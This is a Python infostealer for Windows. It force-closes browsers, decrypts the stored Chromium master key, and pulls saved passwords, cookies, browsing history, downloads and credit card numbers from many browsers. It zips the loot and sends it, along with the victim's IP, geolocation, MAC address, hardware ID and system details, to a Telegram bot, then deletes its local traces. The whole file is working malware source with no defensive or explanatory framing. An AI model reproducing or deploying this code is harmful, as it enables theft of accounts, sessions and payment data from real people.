import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
import shutil
import requests
import re
import uuid
import subprocess
import wmi
import psutil
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

__LOGINS__ = []
__COOKIES__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []

class done:
	def __init__(self):
		self.write_files()
		self.send()
		self.clean()

	def write_files(self):
		os.makedirs("result", exist_ok=True)
		os.makedirs("result\\cookies", exist_ok=True)
		if __LOGINS__:
			with open("result\\logins.txt", "w", encoding="utf-8") as f:
				f.write('\n'.join(str(x) for x in __LOGINS__))

		if __COOKIES__:
			with open("result\\cookies.txt", "w", encoding="utf-8") as f:
				f.write('\n'.join(str(x) for x in __COOKIES__))
			
			for cookie in __COOKIES__:
				file_name = f"host{cookie.host}.txt"
				with open(f"result\\cookies\\{file_name}", "w", encoding="utf-8") as f:
					f.write('\n'.join(str(x) for x in __COOKIES__ if x.host == cookie.host))
		

		if __WEB_HISTORY__:
			with open("result\\web_history.txt", "w", encoding="utf-8") as f:
				f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

		if __DOWNLOADS__:
			with open("result\\downloads.txt", "w", encoding="utf-8") as f:
				f.write('\n'.join(str(x) for x in __DOWNLOADS__))

		if __CARDS__:
			with open("result\\cards.txt", "w", encoding="utf-8") as f:
				f.write('\n'.join(str(x) for x in __CARDS__))
		shutil.make_archive("result", 'zip', "result")

	def send(self):		
		bot_token = ''
		chat_id = ''
		api_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"

		data = {
			'chat_id': chat_id,
			'caption': "```" + '\n'.join(self.tree(Path("result"))) + "```",
			'parse_mode': "Markdown",
			'protect_content': "true",
		}
	
		response = requests.post(api_url, data=data, files={'document': open("result.zip", 'rb')})

		if response.status_code == 200:
			api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
			
			def geolocation(ip: str) -> str:
				url = f"https://ipapi.co/{ip}/json/"
				response = requests.get(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
				data = response.json()
				return (data["country"], data["region"], data["city"], data["postal"], data["asn"])

			ip = requests.get(
				"https://www.cloudflare.com/cdn-cgi/trace").text.split("ip=")[1].split("\n")[0]
			mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
			country, region, city, zip_, as_ = geolocation(ip)
	
			hostname = os.getenv('COMPUTERNAME')
			username = os.getenv('USERNAME')
			disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
			for part in psutil.disk_partitions(all=False):
				if os.name == 'nt':
					if 'cdrom' in part.opts or part.fstype == '':
						continue
				usage = psutil.disk_usage(part.mountpoint)
				disk += ("{:<9} "*4).format(part.device, str(
					usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"

			def get_hwid() -> str:
				try:
					hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
					stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
				except:
					hwid = "None"

				return hwid

			cpu = wmi.WMI().Win32_Processor()[0].Name
			gpu = wmi.WMI().Win32_VideoController()[0].Name
			ram = round(float(wmi.WMI().Win32_OperatingSystem()[
						0].TotalVisibleMemorySize) / 1048576, 0)
			hwid = get_hwid()

			device_data = f"```\nHostname: {hostname}\nUsername: {username}\n\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}\nSTORAGE:\n{disk}```"
			response_data = response.json()
			data = {
				'chat_id': chat_id,
				'reply_to_message_id': response_data['result']['message_id'],
				'text': "🛰️ *Geo Data*:\n\n" + f"```\nIP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}\n```" + "\n\n" + "💻 *Device Data*:\n\n" +  str(device_data),
				'parse_mode': "Markdown",
			}			
			requests.post(api_url, data=data)

	def clean(self):
		shutil.rmtree("result")
		os.remove("result.zip")

	def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
		pipes = {
			'space':  '    ',
			'branch': '│   ',
			'tee':    '├── ',
			'last':   '└── ',
		}

		if prefix == '':
			yield midfix_folder + path.name

		contents = list(path.iterdir())
		pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
		for pointer, path in zip(pointers, contents):
			if path.is_dir():
				yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
				extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
				if str(path) != 'result\\cookies':
					yield from self.tree(path, prefix=prefix+extension)
			else:
				yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"

def close_browser_processes(browser_name):
	try:
		for proc in psutil.process_iter(attrs=['pid', 'name']):
			if proc.info['name'] == browser_name:
				proc.kill()
	except Exception as e:
		pass

class walkthrough:
	def __init__(self):
		self.appdata = os.getenv('LOCALAPPDATA')
		self.browsers = {
			'amigo': self.appdata + '\\Amigo\\User Data',
			'torch': self.appdata + '\\Torch\\User Data',
			'kometa': self.appdata + '\\Kometa\\User Data',
			'orbitum': self.appdata + '\\Orbitum\\User Data',
			'cent-browser': self.appdata + '\\CentBrowser\\User Data',
			'7star': self.appdata + '\\7Star\\7Star\\User Data',
			'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
			'vivaldi': self.appdata + '\\Vivaldi\\User Data',
			'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
			'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
			'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
			'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
			'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
			'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
			'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
			'iridium': self.appdata + '\\Iridium\\User Data',
		}

		self.profiles = [
			'Default',
			'Profile 1',
			'Profile 2',
			'Profile 3',
			'Profile 4',
			'Profile 5',
			'Person 1',
			'Person 2',
			'Person 3',
		]

		for _, path in self.browsers.items():
			if not os.path.exists(path):
				continue

			self.master_key = self.get_master_key(f'{path}\\Local State')
			if not self.master_key:
				continue

			for profile in self.profiles:
				if not os.path.exists(path + '\\' + profile):
					continue

				operations = [
					self.get_login_data,
					self.get_cookies,
					self.get_web_history,
					self.get_downloads,
					self.get_credit_cards,
				]

				for operation in operations:
					try:
						operation(path, profile)
					except Exception as e:
						# print(e)
						pass	

	def get_master_key(self, path: str) -> str:
		if not os.path.exists(path):
			return

		if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
			return

		with open(path, "r", encoding="utf-8") as f:
			c = f.read()
		local_state = json.loads(c)

		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		master_key = master_key[5:]
		master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
		return master_key

	def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
		iv = buff[3:15]
		payload = buff[15:]
		cipher = AES.new(master_key, AES.MODE_GCM, iv)
		decrypted_pass = cipher.decrypt(payload)
		decrypted_pass = decrypted_pass[:-16].decode()

		return decrypted_pass

	def get_login_data(self, path: str, profile: str):
		login_db = f'{path}\\{profile}\\Login Data'
		if not os.path.exists(login_db):
			return

		shutil.copy(login_db, 'login_db')
		conn = sqlite3.connect('login_db')
		cursor = conn.cursor()
		cursor.execute(
			'SELECT action_url, username_value, password_value FROM logins')
		for row in cursor.fetchall():
			if not row[0] or not row[1] or not row[2]:
				continue

			password = self.decrypt_password(row[2], self.master_key)
			__LOGINS__.append(Types.Login(row[0], row[1], password))

		conn.close()
		os.remove('login_db')

	def get_cookies(self, path: str, profile: str):
		cookie_db = f'{path}\\{profile}\\Network\\Cookies'
		if not os.path.exists(cookie_db):
			return

		try:
			shutil.copy(cookie_db, 'cookie_db')
			conn = sqlite3.connect('cookie_db')
			cursor = conn.cursor()
			cursor.execute(
				'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
			for row in cursor.fetchall():
				if not row[0] or not row[1] or not row[2] or not row[3]:
					continue

				cookie = self.decrypt_password(row[3], self.master_key)
				__COOKIES__.append(Types.Cookie(
					row[0], row[1], row[2], cookie, row[4]))

			conn.close()
		except Exception as e:
			print(e)

		os.remove('cookie_db')

	def get_web_history(self, path: str, profile: str):
		web_history_db = f'{path}\\{profile}\\History'
		if not os.path.exists(web_history_db):
			return

		shutil.copy(web_history_db, 'web_history_db')
		conn = sqlite3.connect('web_history_db')
		cursor = conn.cursor()
		cursor.execute('SELECT url, title, last_visit_time FROM urls')
		for row in cursor.fetchall():
			if not row[0] or not row[1] or not row[2]:
				continue

			__WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

		conn.close()
		os.remove('web_history_db')

	def get_downloads(self, path: str, profile: str):
		downloads_db = f'{path}\\{profile}\\History'
		if not os.path.exists(downloads_db):
			return

		shutil.copy(downloads_db, 'downloads_db')
		conn = sqlite3.connect('downloads_db')
		cursor = conn.cursor()
		cursor.execute('SELECT tab_url, target_path FROM downloads')
		for row in cursor.fetchall():
			if not row[0] or not row[1]:
				continue

			__DOWNLOADS__.append(Types.Download(row[0], row[1]))

		conn.close()
		os.remove('downloads_db')

	def get_credit_cards(self, path: str, profile: str):
		cards_db = f'{path}\\{profile}\\Web Data'
		if not os.path.exists(cards_db):
			return

		shutil.copy(cards_db, 'cards_db')
		conn = sqlite3.connect('cards_db')
		cursor = conn.cursor()
		cursor.execute(
			'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
		for row in cursor.fetchall():
			if not row[0] or not row[1] or not row[2] or not row[3]:
				continue

			card_number = self.decrypt_password(row[3], self.master_key)
			__CARDS__.append(Types.CreditCard(
				row[0], row[1], row[2], card_number, row[4]))

		conn.close()
		os.remove('cards_db')


class Types:
	class Login:
		def __init__(self, url, username, password):
			self.url = url
			self.username = username
			self.password = password

		def __str__(self):
			return f'{self.url}\t{self.username}\t{self.password}'

		def __repr__(self):
			return self.__str__()

	class Cookie:
		def __init__(self, host, name, path, value, expires):
			self.host = host
			self.name = name
			self.path = path
			self.value = value
			self.expires = expires

		def __str__(self):
			return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

		def __repr__(self):
			return self.__str__()

	class WebHistory:
		def __init__(self, url, title, timestamp):
			self.url = url
			self.title = title
			self.timestamp = timestamp

		def __str__(self):
			return f'{self.url}\t{self.title}\t{self.timestamp}'

		def __repr__(self):
			return self.__str__()

	class Download:
		def __init__(self, tab_url, target_path):
			self.tab_url = tab_url
			self.target_path = target_path

		def __str__(self):
			return f'{self.tab_url}\t{self.target_path}'

		def __repr__(self):
			return self.__str__()

	class CreditCard:
		def __init__(self, name, month, year, number, date_modified):
			self.name = name
			self.month = month
			self.year = year
			self.number = number
			self.date_modified = date_modified

		def __str__(self):
			return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

		def __repr__(self):
			return self.__str__()


def main():
	# close browsers to avoid stupid windows permission problems
	close_browser_processes("brave.exe")
	close_browser_processes("iexplore.exe")
	close_browser_processes("opera.exe")
	close_browser_processes("safari.exe")
	close_browser_processes("firefox.exe")
	close_browser_processes("chrome.exe")
	close_browser_processes("msedge.exe")
	close_browser_processes("vivaldi.exe")
	close_browser_processes("7Star.exe")
	close_browser_processes("torch.exe")
	close_browser_processes("Sputnik.exe")
	close_browser_processes("browser.exe")
	close_browser_processes("CentBrowser.exe")
	close_browser_processes("amigo.exe")
	# now we can work
	walkthrough()
	done()
if __name__ == '__main__':
	main()